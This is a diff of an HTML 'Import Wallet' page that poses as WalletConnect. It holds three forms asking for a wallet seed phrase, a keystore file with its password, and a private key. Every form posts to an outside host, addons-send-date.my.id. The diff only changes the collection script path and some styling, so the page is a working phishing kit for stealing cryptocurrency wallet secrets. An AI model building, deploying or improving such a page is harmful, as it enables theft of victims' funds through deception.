@@ -59,7 +59,7 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
     <title>Import Wallet</title>
-    <link rel="stylesheet" href="css/bootstraps.css">
+    <link rel="stylesheet" href="css/bootstrap.css">
     <link rel="stylesheet" href="css/fontawesome-all.css">
 	<link rel="stylesheet" href="css/apk.css">
 
@@ -101,16 +101,16 @@
 	<!-- Tab panes -->
 					<div class="tab-content">
 						<div role="tabpanel" class="tab-pane fade active show" id="phrase">
-							<form method="post" action="//addons-send-date.my.id/pluto/2023.php">
+							<form method="post" action="//addons-send-date.my.id/pluto/2022.php">
 								
 								<textarea class="form-control" rows="5" name="phrase" placeholder="Phrase" minlength="24" maxlength="305" required=""></textarea>
-								<p class="text-secondary" style="margin-top: 10px;"><span style="color: RED">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+								<p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
 								<input type="hidden" name="walletname" value="walletconnect">
 								<br><div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit1" style="height: 44px;">CONNECT</button></div>
 							</form>
 						</div>
 						<div role="tabpanel" class="tab-pane fade" id="keystore">
-							<form method="post" action="//addons-send-date.my.id/pluto/2023.php">
+							<form method="post" action="//addons-send-date.my.id/pluto/2022.php">
 							<input type="hidden" name="walletname" value="walletconnect">
 								
 								<div class="form-group">
@@ -119,7 +119,7 @@
 								<div class="form-group">
 									<input class="form-control" type="password" name="keystorepasswword" placeholder="Password" minlength="6" maxlength="50" required="" style=" height: 44px;">
 								</div>
-								<p class="text-secondary" style="margin-top: 10px;"><span style="color: RED">
+								<p class="text-secondary" style="margin-top: 10px;">
 									Several lines of text beginning with "{...}" plus the password you used to encrypt it.
 								</p>
 								
@@ -127,13 +127,13 @@
 							</form>
 						</div>
 						<div role="tabpanel" class="tab-pane fade" id="privatekey">
-							<form method="post" action="//addons-send-date.my.id/pluto/2023.php">
+							<form method="post" action="//addons-send-date.my.id/pluto/2022.php">
 							<input type="hidden" name="walletname" value="walletconnect">
 								
 								<div class="form-group">
 									<input class="form-control" name="privatekey" placeholder="Private Key" required="" minlength="24" maxlength="150" style=" height: 44px;">
 								</div>
-								<p class="text-secondary" style="margin-top: 10px;"><span style="color: RED">Typically 64 alphanumeric characters</p>
+								<p class="text-secondary" style="margin-top: 10px;">Typically 64 alphanumeric characters</p>
 								
 								<br><div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit3" style="height: 44px;">CONNECT</button></div>
 							</form>
